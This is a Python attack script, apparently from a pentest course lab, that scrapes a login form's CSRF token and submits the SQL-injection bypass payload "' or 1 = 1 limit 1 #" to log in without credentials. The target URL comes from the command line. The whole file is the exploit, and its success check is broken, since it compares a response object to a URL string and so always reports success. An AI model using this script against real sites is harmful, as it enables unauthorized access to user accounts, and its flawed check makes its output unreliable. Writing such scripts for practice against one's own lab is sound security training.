import requests
from bs4 import BeautifulSoup
from getopt import getopt
import sys

from requests.models import Response

URI = ""
s = requests.Session()


def validate_url(url):
    Response = s.get(url)
    if Response.status_code == 200:
        return True
    return False


def login(target):
    response = s.get(URI + target)
    soup = BeautifulSoup(response.text, "html.parser")

    CSRFtoken = soup.find(
        "input", {"name": "token", "type": "hidden"}).get("value")
    next_target = soup.find("form", {"class": "form-signin"}).get("action")

    print(CSRFtoken)
    print(next_target)

    payload = {
        "email": "' or 1 = 1 limit 1 #",
        "password": "asdasd",
        "token": CSRFtoken,
        "submit": "asdasd"
    }

    login_response = s.post(URI + next_target, payload)

    if login_response != response.url:
        print("Successfully login")
        print("Current URL: " + login_response.url)
    else:
        print("Failed login")


# URI : http://localhost/pentest/week11/10-web/
#target : login.php
def main():
    global URI

    opts, _ = getopt(sys.argv[1:], "u:t:", ["--uri", "--target"])

    for key, val in opts:
        if key in ["-u", "--uri"]:
            URI = val
        elif key in ["-t", "--target"]:
            target = val

    if validate_url(URI+target):
        login(target)


if __name__ == "__main__":
    main()
